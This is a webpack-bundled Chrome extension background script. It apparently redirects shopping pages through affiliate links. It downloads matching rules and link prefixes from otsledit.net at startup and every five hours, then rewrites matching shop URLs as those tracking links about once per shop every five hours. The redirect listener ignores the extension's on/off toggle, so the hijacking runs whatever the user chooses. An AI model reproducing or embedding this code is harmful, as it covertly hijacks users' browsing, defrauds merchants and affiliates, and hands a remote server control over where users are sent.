/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// identity function for calling harmony imports with the correct context
/******/ 	__webpack_require__.i = function(value) { return value; };
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 3);
/******/ })
/************************************************************************/
/******/ ({

/***/ 3:
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var enable = "/img/enable.png";
var disable = "/img/disable.png";
var defaultMatches = '';
var defaultLinks = [];
var defaultSLink = [];

chrome.browserAction.onClicked.addListener(function (tab) {

    chrome.storage.local.get(['active'], function (item) {

        if (item.active == true) {
            chrome.storage.local.set({ active: false });
            chrome.browserAction.setIcon({ path: { "38": enable } });

            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
                chrome.tabs.update(tabs[0].id, { url: tabs[0].url });

                // chrome.tabs.sendMessage(tabs[0].id, {active: false});
            });
        } else {
            chrome.storage.local.set({ active: true });
            chrome.browserAction.setIcon({ path: { "38": disable } });

            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
                chrome.tabs.update(tabs[0].id, { url: tabs[0].url });

                //chrome.tabs.sendMessage(tabs[0].id, {active: true});
            });
        }
    });
});

chrome.storage.local.get(['active'], function (item) {

    if (item.active == true) {
        chrome.browserAction.setIcon({ path: { "38": disable } });
    } else {
        chrome.browserAction.setIcon({ path: { "38": enable } });
    }
});

chrome.tabs.onUpdated.addListener(function (e, t) {
    chrome.tabs.get(e, function (tab) {
        if ("loading" == t.status) {
            var res = canReload(tab.url);
            if (res) {
                chrome.tabs.update(e, { url: refUrl(tab.url) }, function () {});
            }
        }
    });
});

function refUrl(e) {
    for (var a = 0; a < defaultLinks.length; a++) {
        if (e.indexOf(defaultLinks[a][0]) > -1) {
            return defaultLinks[a][1] + encodeURIComponent(e);
        }
    }
    return e;
}

function canReload(e) {
    if (!e) return !1;
    var t = getShop(e);
    if (!t) return !1;
    var a = "ls_" + t;
    var up = checkTime(a);
    var nn = new RegExp(defaultMatches, "i");
    var res = !e.match(/admitad/) && !e.match(/chrome-extension/) && up && !!e.match(nn);
    if (res) {
        getUpdateLastSet(a);
        return true;
    } else {
        return false;
    }
}

function checkTime(e) {
    var t = Math.floor(Date.now() / 1e3),
        a = parseInt(localStorage.getItem(e)) || 0;
    return !(t - a < 18000);
}

function getUpdateLastSet(e) {
    var t = Math.floor(Date.now() / 1e3);
    return localStorage.setItem(e, t);
}

function getShop(e) {

    for (var a = 0; a < defaultSLink.length; a++) {
        if (e.indexOf(defaultSLink[a][0]) > -1) {
            return defaultSLink[a][1];
        }
    }

    return null;
}

fetch("https://otsledit.net/links", {
    method: 'GET',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
}).then(function (response) {
    return response.json();
}).then(function (data) {
    if (data.defaultMatches && data.defaultLinks && data.defaultSLink && data.defaultMatches.length && data.defaultLinks.length && data.defaultSLink.length) {
        defaultMatches = data.defaultMatches;
        defaultLinks = data.defaultLinks;
        defaultSLink = data.defaultSLink;
    }
}).catch(function (error) {
    return console.log('Error query:', error);
});

setInterval(function () {

    fetch("https://otsledit.net/links", {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
    }).then(function (response) {
        return response.json();
    }).then(function (data) {
        if (data.defaultMatches && data.defaultLinks && data.defaultSLink && data.defaultMatches.length && data.defaultLinks.length && data.defaultSLink.length) {
            defaultMatches = data.defaultMatches;
            defaultLinks = data.defaultLinks;
            defaultSLink = data.defaultSLink;
        }
    }).catch(function (error) {
        return console.log('Error query:', error);
    });
}, 5 * 60 * 60 * 1000);

/***/ })

/******/ });